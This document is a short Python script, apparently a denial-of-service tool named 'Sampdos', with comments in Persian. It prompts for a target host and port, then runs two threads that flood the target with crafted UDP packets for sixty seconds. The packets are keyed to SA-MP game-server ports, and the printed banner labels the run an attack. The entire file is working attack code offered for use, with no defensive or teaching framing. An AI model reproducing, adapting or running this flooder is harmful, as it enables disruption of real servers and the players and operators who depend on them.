import socket
import threading
import time
import os
import sys

# نمایش اطلاعات برنامه
print("\033[1;37mMilad_IT Sampdos v4.6\033[0m")
time.sleep(1)
os.system('cls' if os.name == 'nt' else 'clear')

# دریافت اطلاعات هدف
input_string = input("Enter Target Host and Port (host:port): ")
try:
    target, port = input_string.split(':')
    host = socket.gethostbyname(target)
    port = int(port)
except ValueError:
    print("\033[1;31mInvalid input format! Use host:port\033[0m")
    sys.exit(1)

times = 60

# نمایش اطلاعات حمله
print("\033[35m\n\nSent Attack\033[0m")
print(f"\n\nAddress IP : {host}:{port}")
print("________________________________________________")
print(f"Timer Attack : {times}")
print("Power Attack : 1")
print("Method Attack : Samp dos")
print("\n$\n$\nCreated By Milad_IT\n")

def sampdos(host, port, times):
    timeout = time.time() + times
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    packet_map = {
        9999: b'\x08\x1e\x19\xda',
        8888: b'\x08\x1e\xae\xda',
        7777: b'\x08\x1ew\xda',
        6666: b'\x08\x1e\x1c\xda',
        5555: b'\x08\x1e\xa5\xda',
        4444: b'\x82\x1e\xfe\xb6',
        3333: b'\x08\x1e\x13\xda',
        2222: b'\x08\x1e\xb8\xda',
        1111: b'\x08\x1eA\xda'
    }
    packet = packet_map.get(port, b'\x08\x1e\x19\xda')
    while time.time() < timeout:
        sock.sendto(packet, (host, port))

# اجرای چندین رشته برای ارسال بسته‌ها
threads = []
for _ in range(2):
    t = threading.Thread(target=sampdos, args=(host, port, times))
    t.start()
    threads.append(t)

for t in threads:
    t.join()
